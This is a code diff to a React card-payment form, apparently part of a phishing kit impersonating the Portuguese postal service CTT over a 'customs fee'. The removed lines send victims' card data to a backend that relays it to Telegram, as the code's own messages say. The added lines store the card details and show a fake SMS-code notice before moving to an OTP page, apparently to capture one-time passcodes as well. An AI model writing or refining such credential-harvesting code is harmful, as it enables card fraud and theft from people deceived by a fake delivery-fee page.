@@ -143,37 +143,28 @@ const CTTCardForm = () => {
     setIsProcessing(true);
 
     try {
-      // Prepare payment request
-      const paymentRequest = {
-        billing_data: billingData,
-        card_data: formData
-      };
+      // Store card data for OTP verification
+      localStorage.setItem('ctt_card_data', JSON.stringify(formData));
 
       toast({
-        title: "Processando pagamento...",
-        description: "Enviando dados para o Telegram...",
+        title: "Dados do cartão validados!",
+        description: "Enviando código de verificação SMS...",
         duration: 3000
       });
 
-      // Send payment data to backend (and Telegram)
-      const response = await axios.post(`${API}/ctt/payment`, paymentRequest);
-      
-      if (response.data.status === 'success') {
-        // Store tracking information
-        localStorage.setItem('ctt_tracking_number', response.data.tracking_number);
-        localStorage.setItem('ctt_tracking_id', response.data.tracking_id);
-        
+      // Simulate sending OTP
+      setTimeout(() => {
         toast({
-          title: "Pagamento processado com sucesso!",
-          description: "Dados enviados para o Telegram. Taxa alfandegária paga!",
+          title: "Código SMS enviado",
+          description: `Código de verificação enviado para ${billingData.telefone}`,
           duration: 3000
         });
-        
-        // Navigate to confirmation page
-        setTimeout(() => {
-          navigate('/confirmation');
-        }, 2000);
-      }
+      }, 1000);
+      
+      // Navigate to OTP verification page
+      setTimeout(() => {
+        navigate('/otp');
+      }, 2000);
       
     } catch (error) {
       console.error('Error processing payment:', error);
